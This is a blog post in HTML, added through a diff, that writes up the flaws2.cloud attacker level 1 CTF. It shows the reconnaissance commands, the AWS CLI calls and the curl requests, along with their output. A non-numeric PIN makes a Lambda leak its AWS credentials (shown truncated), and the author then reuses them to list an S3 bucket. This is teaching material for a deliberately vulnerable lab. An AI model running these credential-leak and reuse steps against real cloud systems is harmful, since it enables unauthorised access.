@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="en" style="background-color: rgb(16, 16, 16);">
+	<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+		<meta name="theme-color" content="#000">
+        <meta charset="utf-8">
+		<meta name="viewport" 
+		content="width=device-width, initial-scale=1.0">
+		<link rel="stylesheet" type="text/css" 
+		href="http://localhost:1313/styles/style.css">
+		<title>1cb8c1</title>
+	</head>
+	<body>
+	<nav>
+		<a class="" href="/">Home</a>
+		<a class="" href="/posts">Posts</a>
+		<a class="" href="/tags">Tags</a>
+		<address class="nav-title">1cb8c1</address>
+	</nav>
+    <span aria-hidden="true">------------------------------------------------------------------------<br/><br/></span>
+    
+<article>
+<header class="article-header">
+    <address class="article-author">B. Motyl</address>
+    <time class="article-date" datetime="2025-04-20 20:00:00 &#43;0100 &#43;0100">
+		April 2025
+	</time>
+    <br/>
+    <br/>
+    <h1 class="article-title">
+        CTF - flaws2.cloud Attacker Level 1
+	</h1>
+    <br/>
+</header>
+<h2 id="abstract">Abstract</h2>
+<p>In the &lt;flaws2.cloud&gt; Capture The FLag (CTF) attacker level 1
+challenge, participants must bypass a 100 digit PIN requirement to
+progress.  This document is a report of a an attempt to solve the
+mentioned CTF level.  It provides an overview of the methods and
+steps taken to achieve the solution.</p>
+<h2 id="status-of-this-memo">Status of This Memo</h2>
+<p>This document is published for informational purposes.  It serves
+as a recorded reference for the author&rsquo;s attempt, helping to retain
+the steps taken.  Additionally, it can be used as a guideline for
+presentations or as a teaching resource to help other teams learn
+the concepts and techniques involved in solving this CTF.</p>
+<h2 id="copyright-notice">Copyright Notice</h2>
+<p>This document is licensed under the Creative Commons Attribution 4.0
+International License (CC BY 4.0).</p>
+<h2 id="table-of-contents">Table of Contents</h2>
+
+
+<ul>
+    <li>
+    
+    
+    
+    
+    
+    <a href="#1-information-gathering---hosting" aria-label="1. Information Gathering - Hosting">1</a>.
+    <span class="list-title" aria-hidden="true">Information Gathering - Hosting</span>
+    
+        <span class="list-leader" aria-hidden="true">...............................</span>
+    
+    </li>
+
+    <li>
+    
+    
+    
+    
+    
+    <a href="#2-information-gathering---websites-code" aria-label="2. Information Gathering - Website&#39;s Code">2</a>.
+    <span class="list-title" aria-hidden="true">Information Gathering - Website&#39;s Code</span>
+    
+        <span class="list-leader" aria-hidden="true">........................</span>
+    
+    </li>
+
+    <li>
+    
+    
+    
+    
+    
+    <a href="#3-failed-exploitation-of-excessive-privileges" aria-label="3. [Failed] Exploitation of Excessive Privileges">3</a>.
+    <span class="list-title" aria-hidden="true">[Failed] Exploitation of Excessive Privileges</span>
+    
+        <span class="list-leader" aria-hidden="true">.................</span>
+    
+    </li>
+
+    <li>
+    
+    
+    
+    
+    
+    <a href="#4-succeeded-sending-invalid-input" aria-label="4. [Succeeded] Sending Invalid Input">4</a>.
+    <span class="list-title" aria-hidden="true">[Succeeded] Sending Invalid Input</span>
+    
+        <span class="list-leader" aria-hidden="true">.............................</span>
+    
+    </li>
+
+    <li>
+    
+    
+    
+    
+    
+    <a href="#5-capturing-the-flag" aria-label="5. Capturing The Flag">5</a>.
+    <span class="list-title" aria-hidden="true">Capturing The Flag</span>
+    
+        <span class="list-leader" aria-hidden="true">............................................</span>
+    
+    </li>
+</ul>
+
+<h2 id="1-information-gathering---hosting">1. Information Gathering - Hosting</h2>
+<p>Destination &lt;level1.flaws2.cloud&gt; was pinged in attempt to find more
+clues.</p>
+<pre tabindex="0"><code>ping -c 3 level1.flaws2.cloud
+</code></pre><pre tabindex="0"><code>PING level1.flaws2.cloud (52.217.66.171) 56(84) bytes of data.
+64 bytes from s3-website-us-east-1.amazonaws.com (52.217.66.171): icmp_seq=1 ttl=234 time=110 ms
+64 bytes from s3-website-us-east-1.amazonaws.com (52.217.66.171): icmp_seq=2 ttl=234 time=133 ms
+
+--- level1.flaws2.cloud ping statistics ---
+3 packets transmitted, 2 received, 33.3333% packet loss, time 2001ms
+rtt min/avg/max/mdev = 109.742/121.539/133.337/11.797 ms
+</code></pre><p>In a result of pinging, obtained &lt;s3-website-us-east-1.amazonaws
+.com&gt; gives information that:
+- website is hosted on s3 bucket,
+- region is us-east-1.</p>
+<h2 id="2-information-gathering---websites-code">2. Information Gathering - Website&rsquo;s Code</h2>
+<p>Using curl to see source code of the website.</p>
+<pre tabindex="0"><code>curl -X GET level1.flaws2.cloud
+</code></pre><pre tabindex="0"><code>...
+&lt;form name=&#34;myForm&#34; 
+action=&#34;https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1&#34; 
+onsubmit=&#34;return validateForm()&#34;&gt;
+...
+</code></pre><p>URL &lt;https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/
+default/level1&gt; has been observed.  URL structure indicated AWS API
+Gateway, as it has following structure &lt;https://api-id.execute-api.
+region.amazonaws.com/stage/&gt;.  Structure is stated in the provided
+source &lt;https://docs.aws.amazon.com/apigateway/latest/
+developerguide/how-to-call-api.html&gt;.  Dissecting URL shows that API
+ID is &ldquo;2rfismmoo8&rdquo;, region is &ldquo;us-east-1&rdquo;, and stage is &ldquo;level1&rdquo;.</p>
+<h2 id="3-failed-exploitation-of-excessive-privileges">3. [Failed] Exploitation of Excessive Privileges</h2>
+<p>Attempt to access resources using aws cli v2 and random or no
+credentials was unsuccessful.</p>
+<pre tabindex="0"><code>aws s3 ls s3://level1.flaws2.cloud --region us-east-1 --no-sign-request
+aws apigateway get-resources --rest-api-id 2rfismmoo8 --region us-east-1
+aws apigateway get-stage --rest-api-id 2rfismmoo8 --stage-name default --region us-east-1
+aws apigateway get-method --rest-api-id 2rfismmoo8 --resource-id level1 --http-method GET --region us-east-1
+</code></pre><pre tabindex="0"><code>An error occurred (AccessDenied) when calling the ListObjectsV2...
+An error occurred (AccessDeniedException) when calling the GetResources...
+An error occurred (AccessDeniedException) when calling the GetStage...
+An error occurred (AccessDeniedException) when calling the GetMethod
+</code></pre><h2 id="4-succeeded-sending-invalid-input">4. [Succeeded] Sending Invalid Input</h2>
+<p>Attemp to call AWS API Gateway resource directly results in 301
+redirect.</p>
+<pre tabindex="0"><code>curl -i  https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1?code=1234
+</code></pre><pre tabindex="0"><code>HTTP/2 301
+...
+location: http://level1.flaws2.cloud/index.htm?incorrect
+...
+x-amz-apigw-id: HH8hfFAXIAMEUAw=
+</code></pre><p>Note &ldquo;x-amz-apigw-id&rdquo; header, it is not id of API Gateway, notice
+when calling it again will result in a different value.</p>
+<pre tabindex="0"><code>curl -i  https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1?code=1234
+</code></pre><pre tabindex="0"><code>HTTP/2 301 
+...
+location: http://level1.flaws2.cloud/index.htm?incorrect
+...
+x-amz-apigw-id: HH9UPFV1oAMETtw=
+...
+</code></pre><p>Challenge mentions pin.  An attempt to send something different than
+number.</p>
+<pre tabindex="0"><code>curl -i  https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1?code=a
+</code></pre><p>More data is returned, including aws credentials and name of a
+lambda.</p>
+<pre tabindex="0"><code>{
+  &#34;AWS_ACCESS_KEY_ID&#34;: &#34;ASI...,
+	&#34;AWS_LAMBDA_LOG_GROUP_NAME&#34;: &#34;/aws/lambda/level1&#34;,
+  &#34;AWS_LAMBDA_FUNCTION_NAME&#34;: &#34;level1&#34;,
+	&#34;AWS_SESSION_TOKEN&#34;: &#34;IQo...	
+	&#34;AWS_SECRET_ACCESS_KEY&#34;: &#34;e7J...
+	&#34;AWS_DEFAULT_REGION&#34;: &#34;us-east-1&#34;,
+	...
+}
+</code></pre><h2 id="5-capturing-the-flag">5. Capturing The Flag</h2>
+<p>Configuring credentials.</p>
+<pre tabindex="0"><code>vim ~/.aws/credentials
+</code></pre><pre tabindex="0"><code>[default]
+aws_access_key_id = ASI...
+aws_secret_access_key = e7J...
+aws_session_token = IQo...
+</code></pre><p>Checking credentials.</p>
+<pre tabindex="0"><code>aws sts get-caller-identity
+</code></pre><pre tabindex="0"><code>{
+    &#34;UserId&#34;: &#34;ARO...:level1&#34;,
+    &#34;Account&#34;: &#34;653...&#34;,
+    &#34;Arn&#34;: &#34;arn:aws:sts::653...:assumed-role/level1/level1&#34;
+}
+</code></pre><p>Attempt to list lambdas fails.</p>
+<pre tabindex="0"><code>aws lambda list-functions --region us-east-1
+</code></pre><pre tabindex="0"><code>An error occurred (AccessDeniedException) when calling the ListFunctions...
+</code></pre><p>Attempt to list s3 buckets fails.</p>
+<pre tabindex="0"><code>aws s3 ls
+</code></pre><pre tabindex="0"><code>An error occurred (AccessDenied) when calling the ListBuckets...
+</code></pre><p>Attempt to list level1 s3 bucket succeeds.</p>
+<pre tabindex="0"><code>aws s3 ls s3://level1.flaws2.cloud --region us-east-1
+</code></pre><pre tabindex="0"><code>                           PRE img/
+2018-11-20 21:55:05      17102 favicon.ico
+2018-11-21 03:00:22       1905 hint1.htm
+2018-11-21 03:00:22       2226 hint2.htm
+2018-11-21 03:00:22       2536 hint3.htm
+2018-11-21 03:00:23       2460 hint4.htm
+2018-11-21 03:00:17       3000 index.htm
+2018-11-21 03:00:17       1899 secret-ppxVFdwV4DDtZm8vbQRvhxL8mE6wxNco.html
+</code></pre><p>Get page &lt;http://level1.flaws2.cloud/
+secret-ppxVFdwV4DDtZm8vbQRvhxL8mE6wxNco.html&gt;</p>
+<pre tabindex="0"><code>curl level1.flaws2.cloud/secret-ppxVFdwV4DDtZm8vbQRvhxL8mE6wxNco.html
+</code></pre><pre tabindex="0"><code>...
+The next level is at &lt;a href=&#34;http://level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud&#34;&gt;http://level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud&lt;/a&gt;
+...
+</code></pre><p>Next level is at &lt;http://level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.
+flaws2.cloud&gt;</p>
+
+
+
+
+
+<span aria-hidden="true">------------------------------------------------------------------------</span>
+
+<span><br/>Tags: 
+    
+    [<a href="/tags/it">IT</a>]
+    
+    [<a href="/tags/security">Security</a>]
+    
+    [<a href="/tags/ctf">CTF</a>]
+    
+    [<a href="/tags/flaws2.cloud">flaws2.cloud</a>]
+    
+</span>
+<span aria-hidden="false"><br/><br/></span>
+
+</article>
+
+    </body>
+</html>
